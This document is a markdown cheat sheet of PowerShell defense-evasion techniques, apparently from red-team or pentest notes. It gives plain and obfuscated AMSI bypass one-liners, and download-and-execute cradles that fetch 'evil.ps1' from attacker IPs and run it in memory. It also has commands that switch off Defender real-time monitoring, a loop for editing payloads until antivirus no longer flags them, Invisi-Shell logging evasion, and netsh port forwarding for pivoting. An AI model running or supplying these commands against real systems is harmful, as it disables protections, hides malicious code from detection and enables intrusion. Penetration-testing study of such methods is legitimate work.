

## Tricks to Bypass protections
  * [Execution Policy Protection](#execution-policy-protection)
  * [AMSI Bypass](#amsi-bypass)
  * [Memory Execution](#memory-execution)
  * [Disable Defender](#disable-defender)
  * [Invisi Shell](#invisi-shell)
  * [AMSI Trigger](#amsi-trigger)
  * [References](#references)

### Execution Policy Protection
---
```powershell
C:> powershell -ExecutionPolicy bypass
C:> powershell -c <cmd>
C:> powershell -encodedcommand
C:> $env:PSExecutionPolicyPreference = "bypass"
```

### AMSI Bypass
---
Plain:
```powershell
C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
```
Obfuscation:
```powershell
C:> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
```powershell
C:> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### Memory Execution
---
##### Import Module on Memory
```powershell
C:> iex ((New-Object Net.WebClient).DownloadString('http://<ip_address>/<file>.ps1'));
```
```powershell
C:> $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible ==$False;$ie.navigate('http 192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```powershell
C:> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send;iex $h.responseText
```
```powershell
C:> $wr=[System.NET.WebRequest]::Create("http 192.168.230.1/evil.ps1")
C:> $r=$w. GetResponse()
C:> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
##### Run Remote Script (PSv3 Onwards)
```powershell
C:> iex (iwr 'http://<ip>/evil.ps1' -UseBasicParsing)
```

### Disable Defender
---
Admin Privileges Required
```powershell
C:> Powershell -ep bypass
C:> Set-MpPreference -DisableIOAVProtection $true
C:> Set-MpPreference -Disablerealtimemonitoring $true
C:> "[Ref].Assembly.GetType('System.MAnagement.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublix,Static').SetValue($null,$true)"
```
### Invisi Shell
---
From the [Tool GitHub](https://github.com/OmerYa/Invisi-Shell): _Hide your powershell script in plain sight! Invisi-Shell bypasses all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) by hooking .Net assemblies. The hook is performed via CLR Profiler API._

- Having Admin Privileges:
```powershell
C:> RunWithPathAsAdmin.bat
```
- Non Admin:
```powershell
C:> RunWithRegistryNonAdmin.bat
```

### AMSI Trigger
---
To identify the part of a PowerShell script that is detected by AV. 
Simply provide the path to the script file to scan:
```powershell
C:> AmsiTrigger_x64.exe -i C: AD Tools Invoke PowerShellTcp_Detected.ps1
```
Steps:
- Scan using the tool
- Modify code snippet
- Reescan
- Repeat until we get as result "AMSI_RESULT_NOT_DETECTED" or "Blank"

### AppLocker
---
```powershell
C:> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
Check using Registry Keys:
```powershell
C:> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
C:> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```
#### Constrained LAnguage Mode (CLM)
```powershell
C:> $ExecutionContext.SessionState.LanguageMode
```
- `ConstrainedLanguage`
- `FullLanguage`
> Bypassing AppLocker, automatically bypasses Language Mode
### Port Forwarding
---
```powershell
C:> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x

# To execute using RMI (note the `$null` to avoid redirection issues
C:> $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```

### References
---
- [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/): Ways to Bypass AMSI
- [AMSI Trigger](https://github.com/RythmStick/AMSITrigger)
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)


